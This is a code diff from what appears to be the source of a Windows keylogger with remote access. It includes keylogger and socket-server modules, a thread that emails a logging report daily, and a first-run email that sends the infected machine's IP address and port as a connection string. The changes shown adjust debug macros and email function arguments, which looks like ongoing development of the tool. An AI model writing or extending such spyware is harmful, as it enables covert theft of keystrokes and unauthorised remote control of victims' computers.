@@ -1,5 +1,4 @@
 #include "stdafx.h"
-#define DBG
 
 #include "modules/Keylogger.h"
 #include "modules/SocketServer.h"
@@ -28,13 +27,13 @@ void sendFirstEmail();
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
 	// Add console for debug
-#ifdef DBG
+#ifdef _DEBUG
 	AllocConsole();
 	freopen("CONOUT$", "w", stdout);
 	_setmode(_fileno(stdout), _O_U8TEXT);
 	freopen("CONOUT$", "w", stderr);
 #endif // _DBG
-#ifndef DBG
+#ifndef _DEBUG
 	auto isFirstLaunch = makeFirstLaunch();
 	if (isFirstLaunch) {
 		return 0;
@@ -96,7 +95,7 @@ void mailerThreadProc() {
 		if (currentTime - prevEmailReportTime > SECONDS_IN_DAY) {
 			// Send email in setted up interval of time
 			std::cout << "hello" << std::endl;
-			bool result = logger->sendEmailReport(L"", true);
+			bool result = logger->sendEmailReport(L"", true, false);
 			if (result) {
 				prevEmailReportTime = currentTime;
 				std::cout << "ok";
@@ -174,5 +173,5 @@ void sendFirstEmail() {
 	bodyStream << "To connect use this string:" << std::endl;
 	bodyStream << "connect " << ComputerInfoHelper::getInstance()->getIp() << " " <<
 		ComputerInfoHelper::getInstance()->getPort();
-	emailService->sendEmail(subject, bodyStream.str(), L"");
+	emailService->sendEmail(subject, bodyStream.str(), L"", L"");
 }
